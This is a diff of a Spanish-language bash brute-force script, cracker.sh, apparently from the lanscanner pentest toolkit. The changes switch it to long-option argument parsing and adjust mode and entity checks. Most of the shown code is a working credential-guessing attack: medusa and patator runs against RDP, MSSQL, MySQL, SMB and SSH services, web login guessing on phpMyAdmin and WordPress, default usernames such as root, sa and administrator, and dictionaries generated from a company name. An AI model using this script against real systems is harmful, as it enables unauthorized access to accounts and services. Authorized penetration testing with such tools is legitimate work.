@@ -29,49 +29,63 @@ echo -e "$OKGREEN#################################### EMPEZANDO A CRACKEAR #####
 
 
 
-while getopts ":k:d:l:m:h:e:v:" OPTIONS
-do
-            case $OPTIONS in
-            k)     ENTIDAD=$OPTARG;;            
-            d)     DICTIONARY=$OPTARG;; 
-			l)     LENGUAJE=$OPTARG;;   
-			m)     MODE=$OPTARG;;      
-			e)     EXTRATEST=$OPTARG;;  
-			v)	   VERBOSE=$OPTARG;; 
-            ?)     printf "Opcion invalida: -$OPTARG\n" $0
-                          exit 2;;
-           esac
+while (( "$#" )); do
+  case "$1" in
+    --mode)
+      MODE=$2 #hacking/total
+      shift 2
+      ;;
+    --name)
+      ENTIDAD=$2
+      shift 2
+      ;;
+    --idiom)
+      LENGUAJE=$2 # en/es
+      shift 2
+      ;;
+    --verbose)
+      VERBOSE=$2
+      shift 2
+      ;;
+	--dic)
+      DICTIONARY=$2
+      shift 2
+      ;;
+	--extratest)
+      EXTRATEST=$2
+      shift 2
+      ;;
+    *)
+      echo "Error: Argumento inválido"
+      exit 1
+  esac
 done
 
-ENTIDAD=${ENTIDAD:=NULL}
-DICTIONARY=${DICTIONARY:=NULL}
-MODE=${MODE:=NULL} # vulnerabilidades/hacking/completo
-LENGUAJE=${LENGUAJE:=NULL} # en/es
-EXTRATEST=${EXTRATEST:=NULL} # oscp
-VERBOSE=${VERBOSE:='n'} # s/n
+
 
 tomcat_passwords_combo="/usr/share/lanscanner/tomcat-passwds.txt"
 FILE_SUBDOMAINS="importarMaltego/subdominios-scan.csv"
 
 echo "LENGUAJE $LENGUAJE MODE $MODE ENTIDAD(k) $ENTIDAD DICTIONARY $DICTIONARY EXTRATEST $EXTRATEST VERBOSE:$VERBOSE"
-if [[ ${LENGUAJE} = NULL  ]];then 
+if [[ -z $LENGUAJE ]];then 
 
 cat << "EOF"
 
 Ejecutar el script en el directorio creado por lanscanner (https://github.com/DanielTorres1/lanscanner)
 
 Opciones: 
--k : Nombre de la empresa (Usado para generar diccionario de passwords)
--l : idioma es/en
--m : Mode [vulnerabilidades/hacking]	
--v : Verbose
--d :Diccionario de passwords a usar (opcional)
+--name : Nombre de la empresa (Usado para generar diccionario de passwords)
+--idiom : idioma es/en
+--mode : Mode [hacking/total]	
+--verbose : Verbose
+--dic :Diccionario de passwords a usar (opcional)
+--extratest : oscp
 
 Ejemplo 1: Ataque de diccionario con passwords personallizados (basados en la palabra "microsoft") + 20 passwords mas usados
-	cracker.sh -k microsoft -l es
+	cracker.sh --name microsoft --idiom  es
 
 Ejemplo 2: Ataque de diccionario con lista de passwords
-	cracker.sh -d passwords.txt -l en
+	cracker.sh --dic passwords.txt --idiom en
 EOF
 
 exit
@@ -88,16 +102,16 @@ else
 	admin_user='administrator'
 fi
 
-if [ $EXTRATEST == "oscp" ]; then
+if [ "$EXTRATEST" == "oscp" ]; then
 	PASSWORDS_FILE="/usr/share/lanscanner/passwords-top500-$LENGUAJE.txt"
 else
 	PASSWORDS_FILE="/usr/share/lanscanner/passwords-top50-$LENGUAJE.txt"
 fi
 
 
-if [ $DICTIONARY = NULL ] ; then
+if [ -z $DICTIONARY ] ; then
 
-	if [ $ENTIDAD != NULL ] ; then
+	if [ ! -z $ENTIDAD ] ; then
 		echo "Generando diccionario"
 		echo $ENTIDAD > base.txt
 		passGen.sh -f base.txt -t online -o online.txt
@@ -139,7 +153,7 @@ if [ -f servicios/rdp.txt ]; then
 		
 		##############################
 
-		if [[ -z "$ENTIDAD" && "$ENTIDAD" != NULL ]] ;then	
+		if [[ ! -z $ENTIDAD ]] ;then	
 			####### user $ENTIDAD ####
 			patator.py rdp_login --rate-limit=1 --threads=1 host=$ip user=$ENTIDAD password=FILE0 0=passwords.txt -x quit:egrep='OK|PASSWORD_EXPIRED'  2>> logs/cracking/"$ip"_"$ENTIDAD"-3389_passwordAdivinadoWin2.txt &		
 			##############################
@@ -162,11 +176,11 @@ then
 		echo "medusa -t 1 -f -e ns -u sa -P passwords.txt -h $ip -M mssql -f -t 1 "  >> logs/cracking/"$ip"_1433_passwordBD.txt
 		medusa -t 1 -f -e ns -u sa -P passwords.txt -h $ip -M mssql -f -t 1  >> logs/cracking/"$ip"_1433_passwordBD.txt 2>/dev/null &
 		
-		if [[ "$MODE" == "vulnerabilidades"  || "$MODE" == "completo" ]] ; then
+		if [[ "$MODE" == "total" ]] ; then
 			echo -e "\n medusa -t 1 -f -e ns -u adm -P passwords.txt -h $ip -M mssql -f -t 1 "  >>  logs/cracking/"$ip"_1433_passwordBD.txt
 			medusa -t 1 -f -e ns -u adm -P passwords.txt -h $ip -M mssql -f -t 1 >>  logs/cracking/"$ip"_1433_passwordBD.txt 2>/dev/null &			
 
-			if [[ -z "$ENTIDAD" && "$ENTIDAD" != NULL ]];then
+			if [[ ! -z $ENTIDAD ]];then
 				echo -e "\n medusa -t 1 -f -e ns -u $ENTIDAD -P passwords.txt -h $ip -M mssql -f -t 1 "  >>  logs/cracking/"$ip"_mongo_passwordBD.txt
 				medusa -t 1 -f -e ns -u $ENTIDAD -P passwords.txt -h $ip -M mssql -f -t 1 >>  logs/cracking/"$ip"_mongo_passwordBD.txt &
 			fi
@@ -226,7 +240,7 @@ then
 			echo -e "\n medusa -t 1 -f -e ns -u mysql -P passwords.txt -h $ip -M mysql"  >> logs/cracking/"$ip"_3306_passwordBD.txt
 			medusa -t 1 -f -e ns -u mysql -P passwords.txt -h $ip -M mysql >> logs/cracking/"$ip"_3306_passwordBD.txt 2>/dev/null &
 			
-			if [[ "$MODE" == "vulnerabilidades"  || "$MODE" == "completo" ]] ; then
+			if [[ "$MODE" == "total" ]] ; then
 				# user mysql
 				echo -e "\n medusa -t 1 -f -e ns -u admin -P passwords.txt -h $ip -M mysql " >>  logs/cracking/"$ip"_3306_passwordBD.txt
 				medusa -t 1 -f -e ns -u admin -P passwords.txt -h $ip -M mysql >>  logs/cracking/"$ip"_3306_passwordBD.txt 2>/dev/null &
@@ -235,7 +249,7 @@ then
 				echo -e "\n medusa -t 1 -f -e ns -u $admin_user -P passwords.txt -h $ip -M mysql " >>  logs/cracking/"$ip"_3306_passwordBD.txt				
 				medusa -t 1 -f -e ns -u $admin_user -P passwords.txt -h $ip -M mysql >>  logs/cracking/"$ip"_3306_passwordBD.txt 2>/dev/null &		
 				
-				if [[ -z "$ENTIDAD" && "$ENTIDAD" != NULL ]];then
+				if [[ ! -z $ENTIDAD ]];then
 					echo -e "\n medusa -t 1 -f -e ns -u $ENTIDAD  -P passwords.txt -h $ip -M mysql " >>  logs/cracking/"$ip"_3306_passwordBD.txt				
 					medusa -t 1 -f -e ns -u $ENTIDAD  -P passwords.txt -h $ip -M mysql  >>  logs/cracking/"$ip"_3306_passwordBD.txt	&
 				fi
@@ -264,7 +278,7 @@ then
 			echo "patator smb_login host=$ip user=$admin_user password=FILE0 0=passwords.txt " > logs/cracking/"$ip"_"$admin_user"-smb_passwordAdivinadoWin.txt
 			patator smb_login host=$ip user=$admin_user password=FILE0 0=passwords.txt  2> logs/cracking/"$ip"_"$admin_user"-smb_passwordAdivinadoWin.txt 
 
-			if [[ "$MODE" == "vulnerabilidades" || "$MODE" == "completo" ]]; then 
+			if [[ "$MODE" == "total" ]]; then 
 
 				if [ "$LENGUAJE" == "es" ]; then
 					echo "patator smb_login host=$ip user=soporte password=FILE0 0=passwords.txt " >> logs/cracking/"$ip"_soporte-windows_passwordAdivinadoWin.txt 
@@ -275,7 +289,7 @@ then
 				fi			
 			fi
 
-			if [[ -z "$ENTIDAD" && "$ENTIDAD" != NULL ]];then
+			if [[ ! -z $ENTIDAD ]];then
 				echo "patator smb_login host=$ip user=$ENTIDAD password=FILE0 0=passwords.txt " > logs/cracking/"$ip"_"$ENTIDAD"-smb_passwordAdivinadoWin.txt
 				patator smb_login host=$ip user=$ENTIDAD password=FILE0 0=passwords.txt  2> logs/cracking/"$ip"_"$ENTIDAD"-smb_passwordAdivinadoWin.txt 
 			fi	
@@ -291,16 +305,16 @@ then
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`
 
-		if [[ -z "$ENTIDAD" && "$ENTIDAD" != NULL ]];then
+		if [[ ! -z $ENTIDAD ]];then
 			echo "Usuario $entidad" 
-			medusa -t 1 -f -u $entidad -P passwords.txt -h $ip -M ssh -e s >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt &			
+			medusa -t 1 -f -u $entidad -P passwords.txt -h $ip -M ssh -n $port -e s >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt &			
 		fi				
 
 		if [ -f .enumeracion2/"$ip"_445_localUsers.txt ]; then	
 			echo "Usuarios identificados mediante enum4linux" 
 			for username in $(cat .enumeracion2/"$ip"_445_localUsers.txt); do
 				echo "Probando usuario: $username"
-				medusa -t 1 -f -u $username -P passwords.txt -h $ip -M ssh -e s >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt &
+				medusa -t 1 -f -u $username -P passwords.txt -h $ip -M ssh -n $port -e s >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt &
 			done
 		fi
 
@@ -308,12 +322,12 @@ then
 			echo "Usuarios identificados mediante CVE" 				
 			for username in $(cat .vulnerabilidades2/"$ip"_"$port"_enumeracionUsuariosSSH.txt); do
 				echo "Probando usuario: $username"
-				medusa -t 1 -f -u $username -P passwords.txt -h $ip -M ssh -e s >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt &
+				medusa -t 1 -f -u $username -P passwords.txt -h $ip -M ssh -n $port -e s >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt &
 			done									
 		fi		
 		
 		echo "Probando usuario: root"								
-		medusa -t 1 -f -u root -P passwords.txt -h $ip -M ssh -e s >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt &
+		medusa -t 1 -f -u root -P passwords.txt -h $ip -M ssh -n $port -e s >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt &
 	done	
 fi
 
@@ -355,7 +369,7 @@ then
 			passWeb.pl -s $proto_http -t $host -p $port -m phpmyadmin -d "$path_web" -u admin -f passwords.txt >> logs/cracking/"$host"_"$port"_passwordPhpMyadmin.txt &
 			passWeb.pl -s $proto_http -t $host -p $port -m phpmyadmin -d "$path_web" -u mysql -f passwords.txt >> logs/cracking/"$host"_"$port"_passwordPhpMyadmin.txt &
 
-			if [[ "$MODE" == "vulnerabilidades"  || "$MODE" == "completo" ]] ; then					
+			if [[ "$MODE" == "total" ]] ; then					
 				#######  wordpress user ######
 				grep -qi wordpress .enumeracion2/"$host"_"$port"_webData.txt
 				greprc=$?
@@ -537,7 +551,7 @@ fi
 		#read bruteforce	     
 	#fi
 	  	
-	#if [[ $TYPE = "completo" ]] || [ $bruteforce == "s" ]; then 
+	#if [[ $TYPE = "total" ]] || [ $bruteforce == "s" ]; then 
       	  
 	  #echo -e "$OKBLUE\n\t#################### Testing common pass vmware ######################$RESET"	
 	  #for line in $(cat servicios/vmware.txt); do
@@ -624,7 +638,7 @@ fi
 
 
 
-if [[ "$MODE" == "vulnerabilidades"  || "$MODE" == "completo" ]] ; then	
+if [[ "$MODE" == "total" ]] ; then	
 		
 	### telnet #########
 	if [ -f servicios/telnet.txt ]
@@ -866,7 +880,7 @@ if [[ "$MODE" == "vulnerabilidades"  || "$MODE" == "completo" ]] ; then
 	fi
 
 
-fi #modo completo/vulnerabilidades
+fi #modo total/vulnerabilidades
 
 #echo -e "\t $OKBLUE REVISANDO ERRORES $RESET"
 #grep -ira "timed out" logs/cracking/* 2>/dev/null >> errores.log
@@ -954,7 +968,7 @@ then
 			echo "$admin_user:$creds" >> .vulnerabilidades/"$ip"_3389_passwordAdivinadoWin.txt
 		fi	
 		
-		if [[ -z "$ENTIDAD" && "$ENTIDAD" != NULL ]];then
+		if [[ ! -z $ENTIDAD ]];then
 			grep -v 'Progress' logs/cracking/"$ip"_"$ENTIDAD"-3389_passwordAdivinadoWin2.txt > logs/cracking/"$ip"_"$ENTIDAD"-3389_passwordAdivinadoWin.txt 2>/dev/null
 			rm logs/cracking/"$ip"_"$ENTIDAD"-3389_passwordAdivinadoWin2.txt
 			egrep -iq  "\| ERRCONNECT_PASSWORD_EXPIRED|\| OK" logs/cracking/"$ip"_"$ENTIDAD"-3389_passwordAdivinadoWin.txt
